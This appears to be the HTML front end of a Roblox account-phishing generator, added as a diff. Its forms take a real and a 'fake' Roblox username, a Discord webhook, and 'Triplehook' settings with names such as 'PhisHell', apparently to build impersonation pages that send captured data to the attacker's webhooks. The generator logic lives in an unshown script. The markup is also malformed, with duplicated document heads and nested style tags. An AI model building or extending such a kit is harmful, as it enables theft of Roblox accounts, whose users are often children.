@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Create</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="shortcut icon" href="https://cdn.discordapp.com/attachments/1192082881363836988/1253256598932029551/image.png?ex=6675da69&is=667488e9&hm=b296f1d64f48b9cae4b15ea054119bab79fcf529b997974f3c630cc0f360de81&" type="image/png">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700,900&display=swap" rel="stylesheet">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halaman dengan Navbar di Sisi Kiri dan Container Tengah</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .navbar {
+            width: 200px;
+            background-color: #333;
+            padding: 20px 10px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(255, 255, 255, 0.4);
+            border: 2px solid white;
+        }
+        .navbar a {
+            display: block;
+            color: white;
+            text-decoration: none;
+            padding: 10px;
+            margin-bottom: 10px;
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+        }
+        .navbar a:hover {
+            background-color: #555;
+            transform: translateX(5px) scale(1.05);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.6);
+        }
+        .main-content {
+            max-width: 600px;
+            padding: 20px;
+            background-color: #111;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.4);
+            margin-left: 20px;
+            border: 2px solid white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
+        }
+		    @media (max-width: 768px) {
+        body {
+            flex-direction: column;
+            align-items: stretch;
+        }
+        .navbar {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        .main-content {
+            margin-left: 0;
+            max-width: 100%;
+        }
+    }
+        .button {
+            display: inline-block;
+            background-color: black;
+            color: white;
+            border: 2px solid white;
+            padding: 10px 20px;
+            margin: 10px;
+            text-decoration: none;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s, color 0.3s;
+        }
+        .button:hover {
+            background-color: #222;
+        }
+		        /* Define color variables */
+        :root {
+            --primary-color: #007bff; /* Blue color for regular site */
+            --text-color: #333; /* Text color */
+            --background-color: #f8f9fa; /* Background color for regular site */
+            --secondary-background-color: #f8f9fa; /* Background color for text-wrap */
+        }
+
+        /* Flexbox layout */
+        .wrap {
+            display: flex;
+            justify-content: center;
+            align-items: stretch;
+            gap: 20px;
+        }
+
+        /* Login form */
+        .login-wrap,
+        .text-wrap {
+            flex: 1;
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 30px;
+            background-color: #111;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Titles */
+        h3 {
+            font-weight: bold;
+            color: white;
+        }
+
+        /* Social media icons */
+        .social-media {
+            text-align: right;
+        }
+
+        /* Untuk layar dengan lebar kurang dari atau sama dengan 768px (misalnya perangkat mobile) */
+        @media (max-width: 768px) {
+            /* Mengubah lebar kontainer */
+            .container {
+                padding: 15px; /* Mengurangi padding pada perangkat mobile */
+            }
+            
+            /* Mengubah flex-direction untuk wrap menjadi kolom */
+            .wrap {
+                flex-direction: column;
+            }
+
+            /* Mengatur lebar form */
+            .login-wrap, .text-wrap {
+                width: 100%; /* Mengisi lebar layar penuh */
+            }
+        }
+
+        /* Untuk layar dengan lebar lebih besar dari 768px (misalnya perangkat desktop) */
+        @media (min-width: 769px) {
+            /* Menambahkan padding yang lebih besar untuk desktop */
+            .container {
+                padding: 20px;
+            }
+
+            /* Tetap menggunakan flexbox layout */
+            .wrap {
+                display: flex;
+                justify-content: center;
+                align-items: stretch;
+                gap: 20px;
+            }
+
+            /* Tetap menggunakan flex: 1 untuk masing-masing bagian */
+            .login-wrap, .text-wrap {
+                flex: 1;
+            }
+        }
+
+        /* Center the container vertically */
+        .ftco-section {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh; /* Menggunakan tinggi viewport untuk membuat konten berada di tengah */
+        }
+		<style>
+    /* Style untuk textbox */
+    .form-control {
+        background-color: #222;
+        color: white;
+        border: 2px solid white;
+        padding: 10px;
+        margin-bottom: 20px;
+        border-radius: 5px;
+        width: 100%;
+        box-sizing: border-box;
+        font-size: 16px;
+    }
+
+    /* Style untuk tombol Sign In */
+    .btn-primary {
+        background-color: black;
+        color: white;
+        border: 2px solid white;
+        padding: 10px 20px;
+        margin-top: 20px;
+        border-radius: 5px;
+        cursor: pointer;
+        transition: background-color 0.3s, color 0.3s;
+    }
+
+    .btn-primary:hover {
+        background-color: #222;
+    }
+</style>
+
+    </style>
+</head>
+<body>
+	<div class="main-content">
+<div class="wrap">
+                <div class="login-wrap" id="regularContent">
+                    <h3>Generate Regular</h3>
+                    <form action="#" class="signin-form">
+                        <div class="form-group mb-3">
+                            <label class="label" for="RealUsername">Roblox Username</label>
+                            <input type="text" id="RealUsername" class="form-control btn btn-primary submit px-3" placeholder="Roblox Username" required>
+                        </div>
+                        <div class="form-group mb-3">
+                            <label class="label" for="FakeUsername">Fake Username</label>
+                            <input type="text" id="FakeUsername" class="form-control btn btn-primary submit px-3" placeholder="Fake Username" required>
+                        </div>
+                        <div class="form-group mb-3">
+                            <label class="label" for="Webhook">Webhook</label>
+                            <input type="text" id="Webhook" class="form-control btn btn-primary submit px-3" placeholder="Webhook" required>
+                        </div>
+                        <div class="form-group">
+										<button type="button" onclick="Regular(this);" class="form-control btn btn-primary submit px-3">Create Now!</button>                        </div>
+                    </form>
+                    <div class="social-media">
+                        <a href="" class="social-icon"><i class="fab fa-discord"></i></a>
+                    </div>
+                    <button onclick="showDualhook()" class="form-control btn btn-primary submit px-3">Switch to Tripelhook</button>
+                </div>
+                <div class="text-wrap" id="dualhookContent" style="display: none;">
+                    <h3>Triplehook Generator</h3>
+                    <form action="#" class="signin-form">
+                        <div class="form-group mb-3">
+                            <label class="label" for="Directory">Directory</label>
+                            <input type="text" id="Directory" class="form-control btn btn-primary submit px-3" placeholder="Directory" required>
+                        </div>
+                        <div class="form-group mb-3">
+                            <label class="label" for="Name">Name</label>
+                            <input type="text" id="Name" class="form-control btn btn-primary submit px-3" placeholder="Name (Splunk/Shitest/PhisHell)" required>
+                        </div>
+                        <div class="form-group mb-3">
+                            <label class="label" for="Thumbnails">Thumbnails</label>
+                            <input type="text" id="Thumbnails" class="form-control btn btn-primary submit px-3" placeholder="Thumbnails" required>
+                        </div>
+                        <div class="form-group mb-3">
+                            <label class="label" for="WebhookDualhook">Webhook</label>
+                            <input type="text" id="WebhookDualhook" class="form-control btn btn-primary submit px-3" placeholder="Webhook" required>
+                        </div>
+						<br>
+                        <div class="form-group mb-3">
+							<label class="label" for="Color">Webhook</label>
+                            <input type="color" class="form-control" id="EmbedColor">
+                        </div>
+                        <div class="form-group">
+                            <button type="button" class="form-control btn btn-primary submit px-3" style="width:100%" onclick="Dualhook(this);">Create Now!</button>
+                        </div>
+                    </form>
+					<br><br>
+                    <button onclick="showRegular()" class="form-control btn btn-primary submit px-3">Switch to Regular</button>
+                </div>
+            </div>
+        </div>
+	
+    </section>
+
+    <script src="apis/main.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="new/js/jquery.min.js"></script>
+    <script src="new/js/popper.js"></script>
+    <script src="new/js/bootstrap.min.js"></script>
+    <script src="new/js/main.js"></script>
+    <script>
+        function showDualhook() {
+            document.getElementById('regularContent').style.display = 'none';
+            document.getElementById('dualhookContent').style.display = 'block';
+        }
+
+        function showRegular() {
+            document.getElementById('dualhookContent').style.display = 'none';
+            document.getElementById('regularContent').style.display = 'block';
+        }
+    </script>
+</body>
+
+</html>
+
+	
